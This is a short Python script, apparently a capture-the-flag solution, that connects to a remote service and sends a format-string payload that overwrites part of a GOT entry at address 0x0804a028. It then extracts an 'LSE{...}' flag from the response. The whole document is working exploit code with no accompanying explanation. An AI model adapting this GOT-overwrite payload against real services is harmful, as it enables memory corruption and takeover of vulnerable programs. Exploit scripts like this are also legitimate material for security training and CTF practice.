#!/usr/bin/python3

import sys
import socket
import time
import re

server = (sys.argv[1], int(sys.argv[2]))
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server)

try:
  got = b'\x28\xA0\x04\x08'
  buf = got + b'%.' + str(0x85CB - 4).encode() + b'u%4$hn\n'
  sock.send(buf)
  time.sleep(0.5)
  sock.recv(0x85CB)
  message = sock.recv(100, socket.MSG_DONTWAIT)

  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii', 'ignore')).group(0))
except:
  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii', 'ignore')).group(0))
finally:
  sock.close()

